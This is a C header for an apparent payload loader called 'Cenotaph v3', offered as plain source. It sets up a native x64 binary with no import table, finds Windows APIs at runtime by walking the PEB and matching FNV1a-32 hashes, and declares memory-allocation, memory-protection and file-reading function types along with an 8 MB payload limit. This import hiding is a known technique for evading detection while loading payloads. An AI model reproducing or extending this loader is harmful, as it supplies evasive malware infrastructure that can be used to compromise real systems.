/*
 * Cenotaph v3 — clean-slate disk fallback loader.
 *
 * Zero-IAT native x64 PE.  All APIs resolved at runtime via PEB walk +
 * FNV1a-32 (case-insensitive, matching NaX loader hashes).
 */
#ifndef CENOTAPH_H
#define CENOTAPH_H

#include <windows.h>

#define CEN_MAX_PAYLOAD     (8*1024*1024)
#define CEN_PATH_CAP        1100

typedef LONG NTSTATUS;
#define NT_SUCCESS(s) ( ((NTSTATUS)(s)) >= 0 )

/* FNV1a-32 (case-insensitive) */
#define H_MAGIC_KEY       0x811c9dc5
#define H_MAGIC_PRIME     0x01000193
#define H_MODULE_NTDLL    0x318a7963
#define H_MODULE_KERNEL32 0x04a1a06a

/* PEB / LDR structures (mingw winternl.h is incomplete) */
typedef struct _CEN_UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} CEN_UNICODE_STRING;

typedef struct _CEN_PEB_LDR_DATA {
    ULONG      Length;
    ULONG      Initialized;
    PVOID      SsHandle;
    LIST_ENTRY InLoadOrderModuleList;        /* +0x10 */
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} CEN_PEB_LDR_DATA, *PCEN_PEB_LDR_DATA;

typedef struct _CEN_LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY         InLoadOrderLinks;     /* +0x00 */
    LIST_ENTRY         InMemoryOrderLinks;   /* +0x10 */
    LIST_ENTRY         InInitializationOrderLinks; /* +0x20 */
    PVOID              DllBase;              /* +0x30 */
    PVOID              EntryPoint;           /* +0x38 */
    ULONG              SizeOfImage;          /* +0x40 */
    ULONG              _pad0;               /* +0x44 */
    CEN_UNICODE_STRING FullDllName;          /* +0x48 */
    CEN_UNICODE_STRING BaseDllName;          /* +0x58 */
} CEN_LDR_DATA_TABLE_ENTRY, *PCEN_LDR_DATA_TABLE_ENTRY;

typedef struct _CEN_PEB {
    UCHAR              InheritedAddressSpace; /* +0x00 */
    UCHAR              ReadImageFileExecOptions;
    UCHAR              BeingDebugged;
    UCHAR              BitField;
    PVOID              Mutant;              /* +0x08 */
    PVOID              ImageBaseAddress;    /* +0x10 */
    PCEN_PEB_LDR_DATA  Ldr;                  /* +0x18 */
} CEN_PEB, *PCEN_PEB;

static __inline__ PCEN_PEB CenPeb( void ) {
    return (PCEN_PEB) __readgsqword( 0x60 );
}

/* API typedefs */
typedef NTSTATUS (NTAPI *PFN_NtAllocateVirtualMemory)(
    HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits,
    SIZE_T *RegionSize, ULONG AllocationType, ULONG Protect );

typedef NTSTATUS (NTAPI *PFN_NtProtectVirtualMemory)(
    HANDLE ProcessHandle, PVOID *BaseAddress, SIZE_T *RegionSize,
    ULONG NewProtect, PULONG OldProtect );

typedef NTSTATUS (NTAPI *PFN_NtClose)( HANDLE Handle );

typedef DWORD  (WINAPI *PFN_GetModuleFileNameW)( HMODULE, LPWSTR, DWORD );
typedef HANDLE (WINAPI *PFN_CreateFileW)( LPCWSTR, DWORD, DWORD,
    LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE );
typedef BOOL   (WINAPI *PFN_ReadFile)( HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED );
typedef DWORD  (WINAPI *PFN_GetFileSize)( HANDLE, LPDWORD );
typedef VOID   (WINAPI *PFN_Sleep)( DWORD );
typedef HANDLE (WINAPI *PFN_GetStdHandle)( DWORD );
typedef BOOL   (WINAPI *PFN_WriteConsoleA)( HANDLE, const void*, DWORD, LPDWORD, LPVOID );

/* Public exports from Ldr.c / Utils.c */
extern "C" PVOID CenLdrModulePeb( ULONG Hash );
extern "C" PVOID CenLdrFunction( PVOID Library, ULONG Function );
extern "C" ULONG CenHashString( PVOID String, SIZE_T Length );

#endif /* CENOTAPH_H */
